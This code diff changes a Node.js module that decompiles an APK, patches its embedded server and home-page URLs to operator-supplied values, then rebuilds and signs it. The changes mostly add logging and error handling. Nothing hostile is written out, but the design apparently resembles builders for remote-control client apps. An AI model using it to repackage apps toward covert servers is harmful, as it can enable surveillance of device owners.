@@ -2,6 +2,7 @@ const cp = require('child_process');
 const fs = require('fs');
 const path = require('path');
 const config = require('./config');
+const { logger } = require('./logs');
 
 // Progress file path
 const progressFile = path.join(config.dbPath, 'build_progress.json');
@@ -15,25 +16,33 @@ const builtApkPath = path.join(config.dbPath, 'built_apks');
 const outputApk = path.join(builtApkPath, 'build.apk');
 const signedApk = path.join(builtApkPath, 'build.s.apk');
 
-// Default URLs in the APK (these are placeholders that will be patched)
+// Default URLs in the APK
 const DEFAULT_SERVER_URL = 'http://127.0.0.1:22533';
 const DEFAULT_HOME_PAGE = 'https://google.com';
 
 // Ensure directories exist
 if (!fs.existsSync(builtApkPath)) {
     fs.mkdirSync(builtApkPath, { recursive: true });
+    logger.info('Created built_apks directory', 'build');
 }
 
-function progress(step, message, complete = false) {
+// Progress tracking
+function progress(step, message, complete = false, error = null) {
+    const data = {
+        step,
+        message,
+        complete,
+        error,
+        time: new Date().toISOString()
+    };
+    
     try {
-        fs.writeFileSync(progressFile, JSON.stringify({
-            step,
-            message,
-            complete,
-            time: new Date().toISOString()
-        }));
-    } catch (e) {}
-    console.log(`[BUILD] ${step}: ${message}`);
+        fs.writeFileSync(progressFile, JSON.stringify(data));
+    } catch (e) {
+        logger.systemError('Progress write failed', e);
+    }
+    
+    logger.buildStep(step, message);
 }
 
 function getProgress() {
@@ -48,18 +57,29 @@ function getProgress() {
 // ---------------- JAVA CHECK ----------------
 
 function checkJava(cb) {
-    progress('java', 'Checking Java...');
+    progress('java', 'Checking Java installation...');
+    
     const spawn = cp.spawn('java', ['-version']);
     let output = '';
-
+    
     spawn.stderr.on('data', d => output += d.toString());
-    spawn.on('error', () => cb('Java not found. Install Java 8+'));
-    spawn.on('close', () => {
+    
+    spawn.on('error', () => {
+        const err = 'Java not found. Install Java 8+ to build APKs';
+        progress('java', err, false, err);
+        cb(err);
+    });
+    
+    spawn.on('close', (code) => {
         if (output.includes('version')) {
-            progress('java', 'Java detected', true);
+            const versionMatch = output.match(/version "([^"]+)"/);
+            const version = versionMatch ? versionMatch[1] : 'unknown';
+            progress('java', `Java ${version} detected`, true);
             cb(null);
         } else {
-            cb('Java not detected');
+            const err = 'Java not detected properly';
+            progress('java', err, false, err);
+            cb(err);
         }
     });
 }
@@ -83,27 +103,37 @@ function cleanDecompiled() {
 function decompile(cb) {
     progress('decompile', 'Cleaning workspace...');
     const err = cleanDecompiled();
-    if (err) return cb(err);
-
-    if (!fs.existsSync(rawApkPath)) {
-        return cb('Raw APK not found in app/factory/rawapk/');
+    if (err) {
+        progress('decompile', `Cleanup failed: ${err}`, false, err);
+        return cb(err);
     }
-
-    progress('decompile', 'Decompiling APK...');
+    
+    if (!fs.existsSync(rawApkPath)) {
+        const err = 'Raw APK not found in app/factory/rawapk/';
+        progress('decompile', err, false, err);
+        return cb(err);
+    }
+    
+    progress('decompile', 'Decompiling APK with apktool...');
     const cmd = `java -jar "${apkToolPath}" d "${rawApkPath}" -o "${decompilePath}" -f`;
-
-    cp.exec(cmd, (error) => {
-        if (error) return cb('Decompile failed: ' + error.message);
-        progress('decompile', 'Decompiled successfully', true);
-        cb(null);
+    
+    cp.exec(cmd, { timeout: 120000 }, (error, stdout, stderr) => {
+        if (error) {
+            const err = 'Decompile failed: ' + error.message;
+            progress('decompile', err, false, err);
+            cb(err);
+        } else {
+            progress('decompile', 'Decompiled successfully', true);
+            cb(null);
+        }
     });
 }
 
-// ---------------- DYNAMIC PATCH ----------------
+// ---------------- PATCH ----------------
 
 function getAllSmaliDirs() {
     if (!fs.existsSync(decompilePath)) return [];
-
+    
     return fs.readdirSync(decompilePath)
         .filter(dir => dir.startsWith('smali'))
         .map(dir => path.join(decompilePath, dir));
@@ -111,74 +141,85 @@ function getAllSmaliDirs() {
 
 function getAllSmaliFiles(dir) {
     let results = [];
-
-    const list = fs.readdirSync(dir);
-    list.forEach(file => {
-        const filePath = path.join(dir, file);
-        const stat = fs.statSync(filePath);
-
-        if (stat && stat.isDirectory()) {
-            results = results.concat(getAllSmaliFiles(filePath));
-        } else if (file.endsWith('.smali')) {
-            results.push(filePath);
-        }
-    });
-
+    
+    try {
+        const list = fs.readdirSync(dir);
+        list.forEach(file => {
+            const filePath = path.join(dir, file);
+            const stat = fs.statSync(filePath);
+            
+            if (stat && stat.isDirectory()) {
+                results = results.concat(getAllSmaliFiles(filePath));
+            } else if (file.endsWith('.smali')) {
+                results.push(filePath);
+            }
+        });
+    } catch (e) {
+        logger.systemError('Failed to get smali files', e);
+    }
+    
     return results;
 }
 
-function patch(serverUrl, homePageUrl, cb) {
-    progress('patch', 'Preparing patch data...');
+function escapeRegex(string) {
+    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+}
 
+function patch(serverUrl, homePageUrl, cb) {
+    progress('patch', 'Preparing URL patches...');
+    
     // Ensure server URL has protocol
     let newServerUrl = serverUrl;
     if (!newServerUrl.startsWith('http://') && !newServerUrl.startsWith('https://')) {
         newServerUrl = 'http://' + newServerUrl;
     }
-
+    
     // Default home page if not provided
     let newHomePageUrl = homePageUrl || 'https://google.com';
     if (!newHomePageUrl.startsWith('http://') && !newHomePageUrl.startsWith('https://')) {
         newHomePageUrl = 'https://' + newHomePageUrl;
     }
-
+    
+    progress('patch', `Patching URLs: Server=${newServerUrl}, Home=${newHomePageUrl}`);
+    
     const smaliDirs = getAllSmaliDirs();
     let serverUrlPatched = 0;
     let homePagePatched = 0;
-
-    if (smaliDirs.length === 0)
-        return cb('No smali directories found');
-
+    let filesProcessed = 0;
+    
+    if (smaliDirs.length === 0) {
+        const err = 'No smali directories found. APK may be corrupted.';
+        progress('patch', err, false, err);
+        return cb(err);
+    }
+    
     try {
         progress('patch', 'Scanning and patching smali files...');
         
         smaliDirs.forEach(dir => {
             const files = getAllSmaliFiles(dir);
-
+            
             files.forEach(file => {
                 let data = fs.readFileSync(file, 'utf8');
                 let modified = false;
-
+                
                 // Patch 1: SERVER_HOST field definition
-                // .field public static final SERVER_HOST:Ljava/lang/String; = "http://127.0.0.1:22533"
                 const serverHostFieldRegex = /(\.field\s+[^\n]*\bSERVER_HOST:Ljava\/lang\/String;[^\n]*=\s*")[^"]*(")/g;
                 if (serverHostFieldRegex.test(data)) {
                     data = data.replace(serverHostFieldRegex, `$1${newServerUrl}$2`);
                     modified = true;
                     serverUrlPatched++;
                 }
-
+                
                 // Patch 2: HOME_PAGE_URL field definition
-                // .field public static final HOME_PAGE_URL:Ljava/lang/String; = "https://google.com"
                 const homePageFieldRegex = /(\.field\s+[^\n]*\bHOME_PAGE_URL:Ljava\/lang\/String;[^\n]*=\s*")[^"]*(")/g;
                 if (homePageFieldRegex.test(data)) {
                     data = data.replace(homePageFieldRegex, `$1${newHomePageUrl}$2`);
                     modified = true;
                     homePagePatched++;
                 }
-
-                // Patch 3: const-string with default server URL (handles inlining)
-                // const-string v0, "http://127.0.0.1:22533"
+                
+                // Patch 3: const-string with default server URL
                 const constStringServerRegex = new RegExp(
                     '(const-string\\s+v\\d+,\\s*")' + escapeRegex(DEFAULT_SERVER_URL) + '(")',
                     'g'
@@ -188,9 +229,8 @@ function patch(serverUrl, homePageUrl, cb) {
                     modified = true;
                     serverUrlPatched++;
                 }
-
+                
                 // Patch 4: const-string with default home page URL
-                // const-string v0, "https://google.com"
                 const constStringHomeRegex = new RegExp(
                     '(const-string\\s+v\\d+,\\s*")' + escapeRegex(DEFAULT_HOME_PAGE) + '(")',
                     'g'
@@ -200,75 +240,85 @@ function patch(serverUrl, homePageUrl, cb) {
                     modified = true;
                     homePagePatched++;
                 }
-
-                // Patch 5: Any hardcoded reference to the default URL (catch-all)
-                // This handles cases where the URL might appear in different contexts
+                
+                // Patch 5: Catch-all for remaining references
                 const genericServerUrlRegex = new RegExp(escapeRegex(DEFAULT_SERVER_URL), 'g');
                 if (genericServerUrlRegex.test(data)) {
                     data = data.replace(genericServerUrlRegex, newServerUrl);
                     modified = true;
                     serverUrlPatched++;
                 }
-
+                
                 const genericHomeUrlRegex = new RegExp(escapeRegex(DEFAULT_HOME_PAGE), 'g');
                 if (homePageUrl && genericHomeUrlRegex.test(data)) {
                     data = data.replace(genericHomeUrlRegex, newHomePageUrl);
                     modified = true;
                     homePagePatched++;
                 }
-
+                
                 if (modified) {
                     fs.writeFileSync(file, data, 'utf8');
+                    filesProcessed++;
                 }
             });
         });
-
-        if (serverUrlPatched === 0)
-            return cb('Could not find server URL to patch. APK may be corrupted or already patched.');
-
-        progress('patch', `Patched SERVER_HOST: ${serverUrlPatched} occurrences, HOME_PAGE_URL: ${homePagePatched} occurrences`, true);
+        
+        if (serverUrlPatched === 0) {
+            const err = 'Could not find server URL to patch. APK may be corrupted or already patched.';
+            progress('patch', err, false, err);
+            return cb(err);
+        }
+        
+        progress('patch', `Patched ${filesProcessed} files: SERVER_HOST (${serverUrlPatched}), HOME_PAGE_URL (${homePagePatched})`, true);
         cb(null);
-
+        
     } catch (e) {
-        cb('Patch failed: ' + e.message);
+        const err = 'Patch failed: ' + e.message;
+        progress('patch', err, false, err);
+        cb(err);
     }
-}
-
-// Helper function to escape special regex characters
-function escapeRegex(string) {
-    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
 }
 
 // ---------------- BUILD ----------------
 
 function build(cb) {
-    progress('build', 'Building APK...');
+    progress('build', 'Building APK with apktool...');
     const cmd = `java -jar "${apkToolPath}" b "${decompilePath}" -o "${outputApk}"`;
-
-    cp.exec(cmd, (error) => {
-        if (error) return cb('Build failed: ' + error.message);
-        progress('build', 'APK built successfully', true);
-        cb(null);
+    
+    cp.exec(cmd, { timeout: 180000 }, (error, stdout, stderr) => {
+        if (error) {
+            const err = 'Build failed: ' + error.message;
+            progress('build', err, false, err);
+            cb(err);
+        } else {
+            progress('build', 'APK built successfully', true);
+            cb(null);
+        }
     });
 }
 
 // ---------------- SIGN ----------------
 
 function sign(cb) {
-    progress('sign', 'Signing APK...');
+    progress('sign', 'Signing APK with uber-apk-signer...');
     const cmd = `java -jar "${signerPath}" --apks "${outputApk}" --overwrite`;
-
-    cp.exec(cmd, (error) => {
-        if (error) return cb('Signing failed: ' + error.message);
-
-        try {
-            fs.copyFileSync(outputApk, signedApk);
-        } catch (e) {
-            return cb('Copy failed: ' + e.message);
+    
+    cp.exec(cmd, { timeout: 60000 }, (error, stdout, stderr) => {
+        if (error) {
+            const err = 'Signing failed: ' + error.message;
+            progress('sign', err, false, err);
+            cb(err);
+        } else {
+            try {
+                fs.copyFileSync(outputApk, signedApk);
+                progress('sign', 'APK signed and ready for download', true);
+                cb(null);
+            } catch (e) {
+                const err = 'Copy failed: ' + e.message;
+                progress('sign', err, false, err);
+                cb(err);
+            }
         }
-
-        progress('sign', 'Signed successfully', true);
-        cb(null);
     });
 }
 
@@ -276,45 +326,62 @@ function sign(cb) {
 
 function cleanup() {
     progress('cleanup', 'Cleaning temporary files...');
-    cleanDecompiled();
-    progress('cleanup', 'Done', true);
+    try {
+        cleanDecompiled();
+        progress('cleanup', 'Build completed successfully', true);
+    } catch (e) {
+        logger.systemError('Cleanup failed', e);
+    }
 }
 
 // ---------------- MAIN ----------------
 
 function buildApk(serverUrl, homePageUrl, cb) {
-    if (!serverUrl) return cb('Server URL required');
-
-    // Validate and parse URL
+    if (!serverUrl) {
+        const err = 'Server URL is required';
+        progress('error', err, false, err);
+        return cb(err);
+    }
+    
+    // Validate URL
     let parsedUrl = serverUrl;
     if (!parsedUrl.startsWith('http://') && !parsedUrl.startsWith('https://')) {
         parsedUrl = 'http://' + parsedUrl;
     }
-
+    
     try {
         const urlObj = new URL(parsedUrl);
-        if (!urlObj.hostname) return cb('Invalid URL: no hostname');
+        if (!urlObj.hostname) {
+            const err = 'Invalid URL: no hostname specified';
+            progress('error', err, false, err);
+            return cb(err);
+        }
     } catch (e) {
-        return cb('Invalid server URL format');
+        const err = 'Invalid server URL format: ' + e.message;
+        progress('error', err, false, err);
+        return cb(err);
     }
-
+    
+    logger.info(`Starting APK build for ${serverUrl}`, 'build');
+    
     checkJava(err => {
         if (err) return cb(err);
-
+        
         decompile(err => {
             if (err) return cb(err);
-
+            
             patch(serverUrl, homePageUrl, err => {
                 if (err) return cb(err);
-
+                
                 build(err => {
                     if (err) return cb(err);
-
+                    
                     sign(err => {
                         if (err) return cb(err);
-
+                        
                         cleanup();
-                        progress('done', 'Build completed!', true);
+                        progress('done', 'APK ready for download!', true);
+                        logger.success(`APK build completed for ${serverUrl}`, 'build');
                         cb(null);
                     });
                 });
